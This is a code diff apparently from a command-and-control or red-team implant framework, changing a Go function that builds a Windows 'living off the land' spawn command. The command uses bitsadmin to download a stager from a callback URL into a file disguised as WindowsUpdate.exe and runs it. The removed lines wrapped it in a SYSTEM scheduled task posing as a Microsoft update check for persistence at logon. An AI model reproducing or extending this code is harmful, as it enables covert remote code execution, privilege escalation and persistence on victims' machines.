@@ -582,22 +582,16 @@ func escapeForScBinPath(cmd string) string {
 // GenerateSpawnCommand generates a command to spawn new beacon using only LOLBins
 func (l *LOLBinEscalation) GenerateSpawnCommand(callbackURL string, targetPriv string) string {
 	// Generate a command that spawns a new beacon using only native Windows tools
-	// Use a simple approach without complex nesting
+	// For Admin->System escalation, we need a SIMPLE command that can be wrapped
+	// by the escalation method itself (not pre-wrapped in schtasks)
 	
 	tempFile := `%TEMP%\WindowsUpdate.exe`
 	
-	// Simple download and execute command - NO QUOTES in the command itself
-	// Use environment variables to avoid quote issues
+	// Simple download and execute command - NO QUOTES, NO NESTED COMMANDS
+	// This will be wrapped by the escalation method (schtasks, sc, etc.)
 	downloadAndExec := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s && start /b "" %s`, callbackURL, tempFile, tempFile)
 	
-	if targetPriv == "system" {
-		// For SYSTEM, wrap in scheduled task
-		// Escape quotes for scheduled task /tr parameter
-		escapedCmd := escapeForSchtasks(downloadAndExec)
-		return fmt.Sprintf(`schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "%s" /sc onlogon /ru SYSTEM /f`, escapedCmd)
-	}
-	
-	// For Admin, return the command directly
+	// Return the simple command - the escalation method will wrap it appropriately
 	return downloadAndExec
 }
 
